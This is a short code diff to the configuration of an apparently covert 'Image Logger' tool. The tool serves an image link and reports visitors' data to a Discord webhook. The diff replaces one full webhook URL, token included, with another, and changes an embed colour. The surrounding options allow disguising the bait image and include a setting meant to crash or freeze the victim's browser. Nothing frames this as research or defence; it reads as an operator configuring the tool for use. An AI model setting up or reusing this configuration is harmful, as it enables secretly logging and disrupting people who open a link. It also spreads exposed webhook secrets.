@@ -12,14 +12,14 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1381163516307837030/fgk3wttwit1kBMC4TcXCqT9OIdq2NSJnnxytPzme0bb0qzedIMHSossHFW94XrQQQZSL",
+    "webhook": "https://discord.com/api/webhooks/1381255625367097397/gdjJQR_RX-Ksp_KMsHOq-n-R_W8xn0qx1crS78_xVFkROuncRDkgf-nNBGEdq61wJbGI",
     "image": "https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/04/1-fix-operation-did-not-complete-error-featured.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0xff0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
